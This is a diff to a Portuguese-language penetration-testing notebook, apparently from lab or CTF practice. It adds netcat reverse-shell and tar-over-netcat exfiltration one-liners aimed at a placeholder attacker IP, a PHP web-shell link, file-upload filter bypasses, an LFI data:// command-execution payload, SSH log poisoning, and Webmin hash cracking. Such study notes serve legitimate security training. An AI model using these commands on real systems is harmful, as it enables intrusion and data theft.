@@ -79,8 +79,22 @@ O firewall tende a ser menos restritivo com o modo passivo
 ftp 192.168.0.8 -P 21
 
 ftp USER@HOST PORT
+
+
+# conexão via nc
+nc -v 172.16.1.245 2121
+172.16.1.245 [172.16.1.245] 2121 (iprop) open
+USER decstore
+PASS d3c5t0r3
 ```
-comandos úteis:
+
+**baixar todos os arquivos do servidor**
+```
+ftp> prompt  # desativa a interação com o servidor
+ftp> mget *  # baixa todos os arquivos
+```
+
+**comandos úteis do FTP:**
 1. more teste := abre o arquivo teste
 2. dir
 	Descrição: lista os arquivos do diretório.
@@ -92,6 +106,7 @@ comandos úteis:
 	Descrição: Envia um arquivo do diretório local para o servidor FTP.
 5. mput
 	Descrição: Envia múltiplos arquivos do diretório local para o servidor FTP.
+
 
 ## ftp (passivo x ativo)
 referencial é o servidor
@@ -1116,6 +1131,11 @@ para baixar todo conteudo de uma página
 wget -m <URL>
 ```
 
+realiza a cópia de um site
+```
+wget -mpEk https://example.com
+```
+https://www.howtogeek.com/how-to-copy-a-whole-website-to-your-computer-using-wget/
 # grep
 buscar uma string em todo o sistema
 ```
@@ -1393,27 +1413,35 @@ searchsploit ipfire --id -m <exploit_ID>
 
 ## reverse shell
 ```
+# exemplo 1
 nc ATACKER_IP OPENNED_PORT -c bash
+
+# exemplo 2
 nc ATACKER_IP OPENNED_PORT -e /bin/bash
 ```
-- `-e` Essa opção foi **removida** em versões mais recentes do `netcat`, como a do OpenBSD (`netcat-traditional` não tem `-e
+- `-e` Essa opção foi **removida** em versões mais recentes do `netcat`, como a do OpenBSD (`netcat-traditional` não tem `-e`)
 - `-c` Essa opção só existe em algumas versões do `netcat` (como a GNU Netcat), mas não funciona no OpenBSD `netcat`
 ### envio de multiplos arquivos
 atacante
 ```
 nc -lvp 1234 | tar xvf -
 ```
-opção 1 - escolhendo os arquivos a serem enviados:
+**opção 1:** escolhendo os arquivos a serem enviados:
 servidor
 ```
 tar cf - arquivo1.txt arquivo2.txt | nc ATTACKER_IP 1234
 ```
 
-opção 2 - enviando a pasta toda
+**opção 2:**  enviando a pasta toda
 ```
 tar cf - minha_pasta | nc ATTACKER_IP 1234
 ```
 
+**reverse shell .php**
+- https://github.com/flozz/p0wny-shell/tree/master
+
+**Firewall:**
+- o firewall pode bloquear reverse shell para portas acima de 1024, neste caso é bom tentarmos realizar reverse shell em portas de serviços web (80/443)
 ## SQL
 **comandos SQL**
 loga no banco de dados
@@ -1550,6 +1578,11 @@ flags relevantes
 
 ```
 
+arquivo de outputs do sqlmap
+```
+/home/kali/.local/share/sqlmap/output/
+```
+
 #### SQL -> RCE
 falta fazer
 ```
@@ -1584,9 +1617,29 @@ gobuster dir -u http://10.10.206.2 -w ~/wordlist/SecLists/Discovery/Web-Content/
 -x string              File extension(s) to search for (dir mode only)
 -p string              Proxy to use for requests [http(s)://host:port] (dir mode only)
 
+**cookies e proxy**
+```
+gobuster dir -u [URL] -w [WORDLIST] -e -H ["HEADER_OPTION"] --proxy http://127.0.0.1:8080
+
+
+gobuster dir -u http://172.16.1.245/ -w /usr/share/wordlists/dirb/big.txt -e -H "Cookie: __utmz=254144200.1741386129.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=254144200.298784931.1741386129.1741386129.1741393732.2; PHPSESSID=l64i0ecjv41e20k72nqvib5aq0" --proxy http://127.0.0.1:8080
+```
+
 **subdomain enumeration**
 ```
 gobuster dns -d grupobusinesscorp.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+
+**Correção de Erro:**
+similar ao que ocorre no `fuff` onde toda requisição retorna status code 200, neste caso devemos filtrar as requisições
+```
+Error: the server returns a status code that matches the provided options for non existing urls. http://172.16.1.240:10000/f2110493-95d4-4f6d-8ecb-2700cfdf499f => 200 (Length: 1591). To continue please exclude the status code or the length
+
+# comando corrigido
+gobuster dir -u [URL] -w [WORDLIST] -e --exclude-length 1591
+
+# comando com erro
+gobuster dir -u [URL] -w [WORDLIST] -e
 ```
 
 ### ffuf
@@ -1611,8 +1664,20 @@ filtrando resposta `fr`
 ```
 não exibe resultados que contenham a frase `Invalid username`
 
+**enumerando virtualhost (vhost)/subdomínio:**
+```
+# wordlist de dns
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 
+# forma 1
+ffuf -u "http://172.16.1.240/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ'
 
+# forma 2
+ffuf -u "http://FUZZ.mysite.htb/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+```
+
+A forma 2 só funcionará se:
+- O servidor usa **DNS interno** ou configurações de `/etc/hosts` para mapear subdomínios para o IP `172.16.1.240`.
 
 ## metodos aceitos (get, put, options, head,post)
 - validar os métodos aceitos em cada um dos diretórios da aplicação
@@ -1737,10 +1802,49 @@ commix
 commix --url URL --data="site=[URL]"
 ```
 
+## metadados de imagem
+```
+exiv2 [image.png]
+
+exiftool [image.png]
+```
 ## upload image
 imagetragick
 
-## php wrappers
+**bypass de file upload**
+- https://sagarsajeev.medium.com/file-upload-bypass-to-rce-76991b47ad8f
+
+renomear o arquivo:
+```
+payload.pHp
+payload.pdf.php
+payload.p.phphp # em alguns casos remove a string php, restando payload.php
+```
+
+
+
+em alguns casos, basta trocar o Content-type para dar bypass na extensão permitida:
+no exemplo abaixo o site permitia apenas arquivos .pdf
+```
+# antes
+Content-Type: application/x-php
+# depois
+Content-Type: application/pdf
+```
+
+## php 
+
+bruteforce de parametros
+```
+ffuf -u "URL/banners.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+```
+
+fuzzing de arquivos .php
+```
+ffuf -u "URL/FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+### wrappers
 https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers
 ```
 file:// — Accessing local filesystem
@@ -1772,6 +1876,16 @@ PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImhhY2siXSk7Pz4=
 view-source:http://rh.businesscorp.com.br/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImhhY2siXSk7Pz4=&hack=id
 
 ```
+
+**bypass de file upload (permitido: .pdf, upado: .php)**
+em alguns casos, basta trocar o Content-type para dar bypass na extensão permitida:
+no exemplo abaixo o site permitia apenas arquivos .pdf
+```
+# antes
+Content-Type: application/x-php
+# depois
+Content-Type: application/pdf
+```
 ## joomla
 ```
 joomscan -u URL
@@ -1781,7 +1895,7 @@ indica para interpretar arquivos `.sec` como `.php`
 ```
 AddType application/x-httpd-php .sec
 ```
-## phpmailer
+
 
 ## wordpress
 versão do wordpress
@@ -1914,7 +2028,7 @@ var/log/auth.log
 
 obs: no caso do ssh, ele não permite o envio de caracteres especiais, então então envie o payload via nc e isso vai gerar um log
 ```
- nc -v 172.16.1.177 22                 
+nc -v 172.16.1.177 22                 
 172.16.1.177 [172.16.1.177] 22 (ssh) open
 SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze5
 <?php system($_GET["hack"]);?>
@@ -1924,10 +2038,55 @@ Protocol mismatch.
 GET /lfi.php?file=/var/log/auth.log&hack=ls+-la
 ```
 
-
-
 https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
 
+
+## webmin
+**Webmin** is a web-based server management control panel for Unix-like systems.
+**Arquivos de Configuração do Webmin**:
+```
+/etc/webmin/miniserv.conf  # Contém configurações do servidor Webmin, como portas, SSL e permissões.  
+
+/etc/webmin/miniserv.users # Contém usuários e senhas (em formato hash) do Webmin.
+ 
+/etc/webmin/config # Contém configurações globais do Webmin.
+```
+
+**file disclosure:**
+msfconsole module: admin/webmin/file_disclosure
+```
+admin:$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1:0
+```
+
+
+### hash crack example
+cracking with john
+```
+# example
+admin:$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1:0 # hash.txt
+
+john --format=md5crypt hash.txt # cracking
+```
+
+**cracking with hashcat:**
+With hashcat, we need to remove `admin:` and the `:0` and left only the hash `$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1`
+```
+# hash.txt
+$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1
+
+# cracking
+hashcat -m 500 hash.txt [path_to_wordlist]
+
+hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --show
+$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1:admin123456
+
+```
+notice, we remove the username `admin` from the hash.txt and the hashcat output only the password `admin123456`. For this reason we should make notes and save the username
+
+- **`$1$`**: Indica que a hash é do tipo MD5-crypt.
+- **`XXXXXXXX`**: Salt (valor aleatório usado para gerar a hash).
+- **`WHEbJtn2Q0oxB3s4C6osu1`**: Hash MD5-crypt da senha.
+- **`0`**: Indica que o usuário está ativo.
 ## OWASP
 livro
 - https://github.com/OWASP/wstg/releases
@@ -2246,6 +2405,14 @@ find / -type f -perm 777 2>/dev/null
 configuração do sudo
 ```
 sudo -l
+```
+procura de arquivos, a partir da raiz `/`, com base no nome:
+```
+# qualquer arquivo que tenha a palavra key
+find / -type f -name "*key*"     # ex: key, key.txt, key1, key2, mykey
+
+# arquivos nomeados exatamento como key
+find / -type f -name "key"
 ```
 
 script para scan automatizado
